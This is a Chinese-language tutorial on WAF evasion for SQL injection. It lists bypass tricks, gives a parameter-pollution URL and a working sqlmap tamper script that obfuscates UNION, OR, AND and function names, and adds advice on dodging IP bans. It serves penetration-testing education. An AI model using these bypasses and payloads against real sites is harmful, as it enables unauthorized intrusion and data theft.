---

title: SQLmap 绕 WAF脚本编写


---

## WAF(web application firewall)：Web应用防火墙

WAF为了防御网站被入侵的常见手段：

检测到入侵者会拦截你当前访问的页面，或者跳转到其他界面，再或者直接ban你的IP。

WAF类型：

硬件WAF：有个设备，在网关的地方放一个设备

软件WAF：软件安装

云WAF：云服务上，应该是硬件或软件形式存在的

<!--more-->

区别不大，都是WAF，只不过是规则不同罢了。

WAF的核心检测机制就是正则表达式，通过开发写在WAF中的正则匹配来拦截。

**绕WAF的一定是本地测试成功再实行利用,假如无法本地测试可以选择低频率或者换IP。**

<u>**常见WAF拦截图**</u>

<u>**可以参考这个  https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ**</u>

**通过对应WAF拿到本地来测试**



## **绕WAF的常见手法：**

**1.用其他函数，写法替代**

2.大小写绕过（老WAF）

3.替换绕过：会把关键词替换为空，可以seselectlect,ununionion等

**4.编码绕过：网站需要自带编解码**

**5.注释绕过：WAF会认为注释的东西就是安全的，**

**hpp:http://xxx.com?id=1/*order by 1&id=1 order by 2 -- qw */   它的id传了两次，变量覆盖把前面的传参给覆盖了。**

6.白名单绕过

**7.垃圾数据填充：post传参数据包没有长度限制，WAF检测需要时间，有时会有长度限制**。



常见替代：

空格替代+或者/**/

函数() 用函数/**/()代替

**更多具体绕waf**

**还可以参考**：https://www.cnblogs.com/sunny11/p/14438269.html



## **脚本编写**

*写脚本的前提是**手动可以绕过**，假如绕不过就不用谈写脚本了。*

**参考文章和介绍如下：**

**[sqlmap,Tamper详解及使用指南](https://www.webshell.cc/7162.html)**

tamper脚本位于`sqlmap-master/tamper/`

--list-tampers 查看sqlmap自带的tamper脚本

sqlmap怎么用

用 **--tamper 脚本名称**  来使用



**怎么写？**

![image-20211201171110760](https://www.langsasec.cn/wp-content/uploads/2021/12/image-20211201171110760.png)

def tamper(payload,**kwargs): 
这个是定义了一个函数tamper,然后有两个形参，payload和kwargs

payload实际上就是指sqlmap原本要执行的代码。
kwargs可以用来设置HEAD头信息（不过SQLmap脚本中用的少）我可以在数据包里面设置为啥要用这种脚本？

***照猫画虎***

**因此我们修改自带脚本就好**

通过观察只需要用替换函数设置payload即可

paylod.replace()

return payload

import re  引入python正则库

```python
**代码示例：**

#!/usr/bin/env python

""" Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/) See the file 'LICENSE' for copying permission """

import re # 用于正则匹配

from lib.core.data import kb from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL # 定义优先级，此处是‘一般’

def dependencies(): 
    pass

def tamper(payload, **kwargs): # 定义tamper脚本

#这里写你的过waf代码
#eg:
    payload = payload.replace('UNION', 'uNiOn/*/%0a*a*/')
    payload = payload.replace('DATABASE()', 'dataBase/*!(*/)')
    payload = payload.replace('USER()', 'usEr/*!(*/)')
    payload = payload.replace(' ', '/**/')
    payload = payload.replace('OR', '/*!14400Or*/')
    payload = payload.replace('AND', '/*!14400aNd*/')
#这里写你的过waf代码

	return payload 
```



自带脚本有个base64的脚本也是类似的框架，如果有自己需要的库，自己调用即可，建议学一点python基础

![image-20211201163819648](https://www.langsasec.cn/wp-content/uploads/2021/12/image-20211201163819648.png)

**sqlmap.py  -r 1.txt --tamper 脚本 --flush--session --proxy=http://127.0.0.1:8080**

--flush--session忘记前面数据包的记录

--proxy=http://127.0.0.1:8080 将数据包发到burp的代理上可以看到脚本跑的细节



*封IP怎么办*

1.*访问太快，控制频率：--delay  次数

2.换IP

3.可能有恶意传参被检测，自行检查下

## 永远记住工具不是万能的，脚本不一定就可以跑来数据









